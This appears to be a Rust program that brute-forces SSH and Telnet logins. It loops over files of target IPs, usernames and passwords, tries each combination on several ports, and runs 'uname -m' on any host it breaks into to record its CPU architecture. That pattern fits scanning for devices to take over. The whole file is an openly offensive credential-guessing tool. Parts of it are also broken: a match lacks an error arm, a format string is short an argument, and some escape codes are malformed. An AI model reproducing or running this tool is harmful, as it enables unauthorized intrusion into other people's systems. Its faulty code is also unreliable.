use std::fs::{File};
use std::io::{BufRead, BufReader, Write, Read};
use std::net::{TcpStream, SocketAddr};
use ssh2::Session;
use std::time::{Duration, Instant};
use std::thread;
use std::sync::{Arc};

const SSH_PORTS: [u16; 4] = [22, 2222, 10001, 50000];
const TELNET_PORTS: [u16; 4] = [23, 2323, 4000, 5560];
const TIMEOUT_DURATION: Duration = Duration::from_secs(1);

fn main() {
    
    println!("\x1b[36mDo you want to run the script? (y/n): \x1b[0m");
    std::io::stdout().flush().unwrap();
    let mut input = String::new();
    std::io::stdin().read_line(&mut input).expect("\x1b[36mFailed to read input!\x1b[0m");
    let input = input.trim().to_lowercase();
    if input != "y" {
        println!("\x1b[36mExiting script...\x1b[0m");
        return;
    }

    let ssh_ips = Arc::new(load_file_content("ssh_ips.txt"));
    let telnet_ips = Arc::new(load_file_content("telnet_ips.txt"));
    let ssh_users = Arc::new(load_file_content("ssh_user.txt"));
    let ssh_passwords = Arc::new(load_file_content("ssh_password.txt"));
    let telnet_users = Arc::new(load_file_content("telnet_user.txt"));
    let telnet_passwords = Arc::new(load_file_content("telnet_password.txt"));

    if ssh_ips.is_empty() || ssh_users.is_empty() || ssh_passwords.is_empty() {
        println!("[\x1b[31mERROR\x1b[0m}] \x1b[36mNo valid SSH IPs, usernames, or passwords provided.\x1b[0m");
        return;
    }

    if telnet_ips.is_empty() || telnet_users.is_empty() || telnet_passwords.is_empty() {
        println!("[\x1b[31mERROR\x1b[0m}] \x1b[36mNo valid Telnet IPs, usernames, or passwords provided.\x1b[0m");
        return;
    }

    let ssh_ips = Arc::clone(&ssh_ips);
    let ssh_users = Arc::clone(&ssh_users);
    let ssh_passwords = Arc::clone(&ssh_passwords);
    let telnet_ips = Arc::clone(&telnet_ips);
    let telnet_users = Arc::clone(&telnet_users);
    let telnet_passwords = Arc::clone(&telnet_passwords);

    let ssh_thread = thread::spawn(move || {
        for ip in ssh_ips.iter() {
            for user in ssh_users.iter() {
                for password in ssh_passwords.iter() {
                    for &port in &SSH_PORTS {
                        println!("[\x1b[36mSSH\x1b[0m}] \x1b[36mTrying\x1b[0m \x1b[36mIP: {} Port: {} User: {} Password: \x1b[0m", ip, port, user, password);
                        match try_ssh_connect(ip, user, password, port) {
                            Ok(arch) => {
                                println!("[\x1b[36mSSH\x1b[0m}] Successful login!\x1b[0m \x1b[36mIP: {} Port: {} User: {} Password: {} Arch: {}\x1b[0m", ip, port, user, password, arch);
                            }
                            Err(e) => {
                                if e.contains("timed out") {
                                    println!("[\x1b[36mSSH\x1b[0m \x1b[31mFailed login!\x1b[0m \x1b[36mIP: {} Port: {} User: {} Password: {} Error: Time Out\x1b[0m", ip, port, user, password);
                                }
                            }
                        }
                    }
                }
            }
        }
    });

    let telnet_thread = thread::spawn(move || {
        for ip in telnet_ips.iter() {
            for user in telnet_users.iter() {
                for password in telnet_passwords.iter() {
                    for &port in &TELNET_PORTS {
                        println!("[\x1b[36mTELNET\x1b[0m}] \x1b[36mTrying IP: {} Port: {} User: {} Password: {}\x1b[0m", ip, port, user, password);
                        match try_telnet_connect(ip, user, password, port) {
                            Ok(arch) => {
                                println!("[\x1b[36mTELNET\x1b[0m}] \x1b[32Successful login!\x1b[0m \x1b[36mIP: {} Port: {} User: {} Password: {} Arch: {}\x1b[0m", ip, port, user, password, arch);
                            }
                            Err(e) => {
                                if e.contains("timed out") {
                                    println!("[\x1b[36mTELNET\x1b[0m}] \x1b[31mFailed login!\x1b[0m \x1b[36mIP: {} Port: {} User: {} Password: {} Error: Time Out\x1b[0m", ip, port, user, password);
                                }
                            }
                        }
                    }
                }
            }
        }
    });

    ssh_thread.join().unwrap();
    telnet_thread.join().unwrap();

    println!("\n\x1b[36mAll login attempts finished!\x1b[0m");
}

fn load_file_content(filename: &str) -> Vec<String> {
    match read_lines(filename) {
        Ok(lines) => lines,
        Err(e) => {
            println!("[\x1b[31mERROR\x1b[0m}] \x1b[36mError reading {}: {}\x1b[0m", filename, e);
            vec![]
        }
    }
}

fn read_lines(filename: &str) -> Result<Vec<String>, std::io::Error> {
    let file = File::open(filename)?;
    let reader = BufReader::new(file);
    reader.lines().collect()
}

fn try_ssh_connect(ip: &str, user: &str, password: &str, port: u16) -> Result<String, String> {
    let addr = format!("{}:{}", ip, port).parse::<SocketAddr>().unwrap();
    let start_time = Instant::now();

    match TcpStream::connect_timeout(&addr, TIMEOUT_DURATION) {
        Ok(tcp) => {
            tcp.set_read_timeout(Some(TIMEOUT_DURATION)).expect("[\x1b[31mERROR\x1b[0m}] \x1b[36mCould not set read timeout");
            let mut session = Session::new().map_err(|e| format!("[\x1b[31mERROR\x1b[0m}] \x1b[36mFailed to create session: {}", e))?;
            session.set_tcp_stream(tcp);
            session.handshake().map_err(|e| format!("[\x1b[31mERROR\x1b[0m}] \x1b[36mHandshake failed: {}\x1b[0m", e))?;
            if session.userauth_password(user, password).is_ok() {
                return get_ssh_architecture(&session);
            }
        },
        Err(e_) => return Err(format!("[\x1b[31mERROR\x1b[0m}] \x1b[36mConnection to {}:{} timed out after {:.2?}. Error: {}\x1b[0m", ip, port, start_time.elapsed())),
    }
    Err(format!("[\x1b[31mERROR\x1b[0m}] \x1b[36mFailed to authenticate on {}:{}\x1b[0m", ip, port))
}

fn get_ssh_architecture(session: &Session) -> Result<String, String> {
    let mut channel = session.channel_session().map_err(|e| format!("[\x1b[31mERROR\x1b[0m}] \x1b[36mFailed to open channel: {}\x1b[0m", e))?;
    channel.exec("uname -m").map_err(|e| format!("[\x1b[31mERROR\x1b[0m}] \x1b[36mFailed to execute command: {}\x1b[0m", e))?;
    let mut arch = String::new();
    channel.read_to_string(&mut arch).map_err(|e| format!("[\x1b[31mERROR\x1b[0m}] \x1b[36mFailed to read architecture: {}\x1b[0m", e))?;
    channel.wait_close().map_err(|e| format!("[\x1b[31mERROR\x1b[0m}] \x1b[36mFailed to close channel: {}\x1b[0m", e))?;
    Ok(arch.trim().to_string())
}

fn try_telnet_connect(ip: &str, user: &str, password: &str, port: u16) -> Result<String, String> {
    let addr = format!("{}:{}", ip, port).parse::<SocketAddr>().unwrap();
    let start_time = Instant::now();

    match TcpStream::connect_timeout(&addr, TIMEOUT_DURATION) {
        Ok(mut stream) => {
            stream.set_read_timeout(Some(TIMEOUT_DURATION)).expect("[\x1b[31mERROR\x1b[0m}] \x1b[36mCould not set read timeout\x1b[0m");
            let login_command = format!("{}\n{}\n", user, password);
            if stream.write_all(login_command.as_bytes()).is_ok() {
                let mut response = String::new();
                let mut reader = BufReader::new(stream.try_clone().expect("[\x1b[31mERROR\x1b[0m}] \x1b[36mFailed to clone stream\x1b[0m"));
                if reader.read_line(&mut response).is_ok() && (response.contains("Login successful") || response.contains("Welcome")) {
                    let arch_command = "uname -m\n";
                    if stream.write_all(arch_command.as_bytes()).is_ok() {
                        let mut arch_response = String::new();
                        if reader.read_line(&mut arch_response).is_ok() {
                            return Ok(arch_response.trim().to_string());
                        }
                    }
                }
            }
        }
    }
    Err(format!("[\x1b[31mERROR\x1b{0m}] \x1b[36mFailed to authenticate on {}:{}\x1b[0m", ip, port))
}